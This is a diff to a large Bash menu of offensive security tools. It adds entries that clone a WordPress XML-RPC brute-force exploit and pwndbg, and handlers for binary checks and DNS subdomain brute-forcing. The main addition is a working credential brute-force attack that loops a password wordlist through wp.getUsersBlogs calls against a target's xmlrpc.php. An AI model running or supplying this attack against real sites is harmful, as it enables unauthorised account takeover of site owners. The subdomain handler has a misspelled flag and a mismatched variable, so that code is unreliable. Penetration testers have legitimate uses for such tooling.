@@ -317,7 +317,7 @@ function Stampa
 	fi
 }
 
-for TOOL in "lynx" "tput" "git" "strace" "ltrace" "hydra" "nmblookup" "rlogin" "docker" "john" "gzip" "mdless" "bettercap"
+for TOOL in "lynx" "tput" "git" "strace" "ltrace" "hydra" "nmblookup" "rlogin" "docker" "john" "gzip" "mdless" "bettercap" "checksec"
 do
 	if [[ ! -f $(which $TOOL) ]];
 	then
@@ -1804,10 +1804,11 @@ while true; do
 		Stampa " 1533. kkonradpl/mtscan"
 		echo "$SEP"
 	fi
-	echo "$CFQ"" FQ. RPC"
+	echo "$CFQ"" FQ. RPC - XMLRPC"
 	if [[ "$CFQ" == "[-]" ]];
 	then
 		Stampa " 233. aress31/xmlrpc-bruteforcer" "313. s4vitar/rpcenum" "570. hegusung/RPCScan"
+		Stampa " 2668. 1N3/Wordpress-XMLRPC-Brute-Force-Exploit"
 		echo "$SEP"
 	fi
 	echo "$CFR"" FR. RSA"
@@ -2101,6 +2102,7 @@ while true; do
 		Stampa " 2662. OR bitwise a string value" "2660. OR bitwise an array of chars converted in INT values"
 		echo " 2659. AND bitwise an array of chars converted in INT values"
 		Stampa " 2663. set User-Agent" "2664. set Headers" "2665. set Cookies"
+		Stampa " 2667. xmlrpc list methods" "2666. xmlrpc password brute force attack" "2669. check binary's security"
 		echo "$SEP"
 	fi
 	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
@@ -2279,7 +2281,7 @@ while true; do
 	echo "$CHN"" HN. PLUGIN"
 	if [[ "$CHN" == "[-]" ]];
 	then
-		Stampa " 1499. hahwul/metasploit-autopwn/db_autopwn"
+		Stampa " 1499. hahwul/metasploit-autopwn/db_autopwn" "2670. pwndbg/pwndbg"
 		echo "$SEP"
 	fi
 	echo "$SEP"
@@ -12900,6 +12902,65 @@ while true; do
 		then
 			echo -e "keep_session_cookies = on\ncookies = on\nsave_cookies = ""$WGETCOOKIE""\nload_cookies = ""$WGETCOOKIE""\nheader = ""$COOKIE""\n" >> $WGETCONFIG
 			echo "$COOKIE" > $CURLCOOKIE
+		fi
+	;;
+	"2666")
+		echo "Digit the full path to xmlrpc.php"
+		read -p "(example, https://www.target.com/xmlrpc.php): " TURLX
+		if [[ "$TURLX" != "" ]];
+		then
+			echo "Digit the target Username"
+			read -p "(example, admin): " USRN
+			if [[ "$USRN" != "" ]];
+			then
+				if [[ "$WORDLIST" == "" ]];
+				then
+					echo "Digit the wordlist password file"
+					read -e -p "(example, /usr/share/wordlist/rockyou.txt): " WORDLIST
+				fi
+				if [[ -f "$WORDLIST" ]];
+				then
+					for PSS in $(cat "$WORDLIST")
+					do
+						curl -X POST -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>""$USRN""</value></param><param><value>""$PSS""</value></param></params></methodCall>" "$TURLX"
+					done
+				fi
+			fi
+		fi
+	;;
+	"2667")
+		echo "Digit the full path to xmlrpc.php"
+		read -p "(example, https://www.target.com/xmlrpc.php): " TURLX
+		if [[ "$TURLX" != "" ]];
+		then
+			curl -X POST -d "<?xml version=\"1.0\" encoding=\"utf-8\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" "$TURLX"
+		fi
+	;;
+	"2668")
+		Clona "1N3/Wordpress-XMLRPC-Brute-Force-Exploit"
+	;;
+	"2669")
+		echo "Digit a binary to check its security setting"
+		read -e -p "(example, vuln.bin): " BFL
+		if [[ "$BFL" != "" && -f "$BFL" ]];
+		then
+			checksec --file $BFL
+		fi
+	;;
+	"2670")
+		Clona "pwndbg/pwndbg"
+	;;
+	"2671")
+		if [[ "$TDOM" == "" ]];
+		then
+			echo "Digit the target domain"
+			read -p "(example, target.com): " TDOM
+		fi
+		echo "Digit the dns wordlist file"
+		read -e -p "(example, /opt/SecList/Discovery/DNS/subdomains-top1million-110000.txt): " DNSW
+		if [[ "$DNSW" != "" && -f "$DNSW" ]];
+		then
+			gobuster dns --wildchard -d "$TDM" -w "$DNSW"
 		fi
 	;;
 	"AA")
